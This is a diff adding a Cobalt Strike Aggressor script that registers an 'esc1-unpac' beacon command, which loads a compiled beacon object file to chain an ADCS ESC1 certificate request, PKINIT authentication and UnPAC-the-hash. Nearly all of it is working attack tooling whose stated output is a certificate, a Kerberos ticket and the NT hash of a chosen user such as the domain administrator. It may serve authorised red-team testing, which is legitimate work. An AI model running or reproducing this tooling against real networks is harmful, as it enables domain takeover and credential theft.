@@ -1,0 +1,111 @@
+# ESC1-unPAC - Cobalt Strike Aggressor Script
+# Complete ADCS ESC1 attack chain: ESC1 -> PKINIT -> UnPAC-the-hash
+#
+# Usage:
+#   esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]
+#
+# Example:
+#   esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
+
+# Get script location for BOF path
+$script_path = script_resource();
+
+# Register the alias
+alias esc1-unpac {
+    local('$bid $ca $template $upn $kdc $nosid $bof $args');
+
+    $bid = $1;
+    $ca = $2;
+    $template = $3;
+    $upn = $4;
+    $kdc = $5;
+    $nosid = $6;
+
+    # Validate required arguments
+    if ($ca eq "" || $template eq "" || $upn eq "") {
+        berror($bid, "Usage: esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]");
+        berror($bid, "");
+        berror($bid, "Complete attack chain: ESC1 -> PKINIT -> UnPAC-the-hash");
+        berror($bid, "");
+        berror($bid, "Example: esc1-unpac EVILCA1.evilcorp.net\\\\evilcorp-EVILCA1-CA ESC1Template administrator\@evilcorp.net");
+        berror($bid, "With KDC: esc1-unpac EVILCA1.evilcorp.net\\\\evilcorp-EVILCA1-CA ESC1Template admin\@evilcorp.net dc01.evilcorp.net");
+        berror($bid, "Add 'nosid' to disable SID in certificate (not recommended)");
+        return;
+    }
+
+    # Set defaults for optional params
+    if ($kdc eq $null) { $kdc = ""; }
+    if ($nosid eq $null) { $nosid = ""; }
+
+    # Load BOF
+    $bof = script_resource("../havoc/bofs/ESC1-unPAC.x64.o");
+
+    if (!-exists $bof) {
+        berror($bid, "BOF not found: $bof");
+        berror($bid, "Make sure to compile the BOF first with: make");
+        return;
+    }
+
+    # Determine SID status for output
+    $sid_status = "(with SID)";
+    if ($nosid eq "nosid" || $nosid eq "no" || $nosid eq "false" || $nosid eq "0") {
+        $sid_status = "(without SID)";
+    }
+
+    btask($bid, "ESC1-unPAC: CA= $+ $ca Template= $+ $template UPN= $+ $upn $sid_status");
+
+    # Pack arguments: 5 strings (CA, Template, UPN, KDC, nosid)
+    $args = bof_pack($bid, "zzzzz", $ca, $template, $upn, $kdc, $nosid);
+
+    # Execute BOF
+    beacon_inline_execute($bid, readbof($bof), "go", $args);
+}
+
+# Helper function to read BOF file
+sub readbof {
+    local('$bof $handle $data');
+    $bof = $1;
+    $handle = openf($bof);
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+# Register beacon command help
+beacon_command_register(
+    "esc1-unpac",
+    "ESC1 + PKINIT + UnPAC-the-hash (complete ADCS attack chain)",
+    "
+Command: esc1-unpac
+Summary: Complete ADCS ESC1 exploitation chain in a single command
+
+Usage:   esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]
+
+Arguments:
+    CA        - Certificate Authority (e.g., CA01.corp.local\\\\corp-CA01-CA)
+    Template  - Vulnerable certificate template name
+    UPN       - Target user's UPN (e.g., administrator\@corp.local)
+    KDC       - (Optional) KDC hostname for PKINIT
+    nosid     - (Optional) Add 'nosid' to disable SID in certificate
+
+Example:
+    esc1-unpac EVILCA1.evilcorp.net\\\\evilcorp-EVILCA1-CA ESC1Template administrator\@evilcorp.net
+
+Output:
+    - PFX certificate (base64, password: SpicyAD123)
+    - TGT in kirbi format (Rubeus compatible)
+    - NT Hash of target user
+"
+);
+
+# Print load message
+println("");
+println("=========================================");
+println("        ESC1-unPAC Loaded");
+println("=========================================");
+println("");
+println("Command: esc1-unpac <CA> <Template> <UPN> [KDC] [nosid]");
+println("");
+println("Example:");
+println("  esc1-unpac EVILCA1.evilcorp.net\\\\evilcorp-EVILCA1-CA ESC1Template administrator\@evilcorp.net");
+println("");
